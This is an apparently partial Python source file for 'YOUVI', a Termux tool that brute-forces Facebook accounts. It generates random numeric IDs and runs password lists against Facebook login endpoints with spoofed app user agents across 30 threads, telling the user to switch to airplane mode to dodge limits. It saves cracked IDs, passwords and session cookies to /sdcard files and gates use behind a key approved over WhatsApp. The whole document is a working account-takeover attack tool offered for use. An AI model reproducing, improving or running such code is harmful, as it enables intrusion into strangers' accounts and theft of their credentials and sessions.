...
try:
    ...
    os.system('python YOUVI.py')
try:
    os.mkdir('/sdcard/YOUVI')
except:pass
import os
import sys
import time
...
logo=(f"""\033[1;37m                                                                
 \033[1;32m 8b        d8  ,ad8888ba,    88        88  8b           d8  88  
 \033[1;32m Y8,    ,8P  d8"'    `"8b   88        88  `8b         d8'  88  
 \033[1;37m  Y8,  ,8P  d8'        `8b  88        88   `8b       d8'   88  
 \033[1;37m   "8aa8"   88          88  88        88    `8b     d8'    88  
 \033[1;32m   `88'    88          88  88        88     `8b   d8'     88  
 \033[1;37m     88     Y8,        ,8P  88        88      `8b d8'      88  
 \033[1;37m     88      Y8a.    .a8P   Y8a.    .a8P       `888'       88  
 \033[1;32m     88       `"Y8888Y"'     `"Y8888Y"'         `8'        88                                                                                                                                                 
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ...
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 0,2
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in D
 YOUVI folder
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome YOUVI Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print(" \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mYOUVI Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
...
def afg():
                ...
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as YOUVI:     
                        clear()
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [YOUVI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 8.0; SM-A320FL Build/R16NW) [FBAN/Orca-Android;FBAV/299.0.0.0.114;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/256778900;FBCR/Orange;FBMF/samsung;FBBD/Galaxy A3;FBDV/SM-A320FL;FBSV/8.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 8.1; SM-A505FN Build/OPM1.171019.011) [FBAN/Orca-Android;FBAV/298.0.0.0.113;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/255667889;FBCR/Vodafone;FBMF/samsung;FBBD/Galaxy A50;FBDV/SM-A505FN;FBSV/8.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2340};FB_FW/1;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [YOUVI-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/OUSSAMA/YOUVI-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [YOUVI-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/OUSSAMA/YOUVI-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/OUSSAMA/YOUVI-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [YOUVI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/DOD/SEBTI-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DOD/SEBTI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [YOUVI-Ok] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [YOUVI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/YOUVI/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/YOUVI/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [YOUVI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/YOUVI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [YOUVI-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/YOUVI/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.YOUVI.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.YOUVI.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python YOUVI.py')
        tks = ('Hello%20YOUVI%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)

    r1 = requests.get('https://github.com/oussama-youuvi/xp-404/blob/main/Xs.txt').text
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20YOUVI%20Owner%20YOUVI-SB%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213782667310?text='+tks)
        menu()
menu()
